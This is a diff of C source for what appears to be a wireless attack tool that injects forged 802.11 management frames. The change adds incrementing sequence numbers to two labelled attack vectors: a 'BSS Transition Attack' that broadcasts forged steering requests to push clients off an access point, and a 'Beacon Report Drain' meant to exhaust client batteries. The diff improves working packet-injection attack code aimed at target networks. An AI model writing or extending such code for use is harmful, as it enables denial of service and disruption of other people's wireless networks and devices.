@@ -1523,11 +1523,11 @@ static int mk_sae_commit(uint8_t *b, const uint8_t bss[6],
  *             Category=10 (WNM), Action=7 (BTM Request)
  * ============================================================ */
 static int mk_bss_transition(uint8_t *b, const uint8_t bss[6],
-                             const uint8_t cli[6]) {
+                             const uint8_t cli[6], uint16_t seq) {
   int o = 0;
   o += mk_rt(b + o);
   
-  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
+  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, seq);
 
   
   b[o++] = 10;
@@ -1591,11 +1591,11 @@ static int mk_bss_transition(uint8_t *b, const uint8_t bss[6],
  *             Category=5 (Radio Measurement), Action=0 (Req)
  * ============================================================ */
 static int mk_beacon_report_req(uint8_t *b, const uint8_t bss[6],
-                                const uint8_t cli[6], uint8_t cur_ch) {
+                                const uint8_t cli[6], uint8_t cur_ch, uint16_t seq) {
   int o = 0;
   o += mk_rt(b + o);
   
-  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
+  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, seq);
 
   
   b[o++] = 5;
@@ -1774,11 +1774,11 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   }
 
   /* Vector #19: BSS Transition Attack — BTM Request to broadcast */
-  f->bss_transition.len = mk_bss_transition(f->bss_transition.buf, bss, BCAST);
+  f->bss_transition.len = mk_bss_transition(f->bss_transition.buf, bss, BCAST, 0);
 
   /* Vector #20: Beacon Report Drain — Measurement Request to broadcast */
   f->beacon_report.len =
-      mk_beacon_report_req(f->beacon_report.buf, bss, BCAST, cur_ch);
+      mk_beacon_report_req(f->beacon_report.buf, bss, BCAST, cur_ch, 0);
 
   for (int i = 0; i < MAX_AUTH_POOL; i++) {
     uint8_t fm[6];
@@ -4486,7 +4486,7 @@ static void *stress_injector_thread(void *arg) {
       /* Vector #19: BSS Transition Attack (802.11v Steer) */
       if (a->cfg->vec_on[VEC_BSS_TRANSITION]) {
         
-        len = mk_bss_transition(tmp, bss, BCAST);
+        len = mk_bss_transition(tmp, bss, BCAST, seq++);
         if (inject_one(sock, tmp, len) > 0) {
           { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
@@ -4498,7 +4498,7 @@ static void *stress_injector_thread(void *arg) {
       /* Vector #20: Beacon Report Drain (Battery Exploitation) */
       if (a->cfg->vec_on[VEC_BEACON_REPORT_DRAIN]) {
         
-        len = mk_beacon_report_req(tmp, bss, BCAST, (uint8_t)snap[i].channel);
+        len = mk_beacon_report_req(tmp, bss, BCAST, (uint8_t)snap[i].channel, seq++);
         if (inject_one(sock, tmp, len) > 0) {
           { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
           sent_for_ap++;
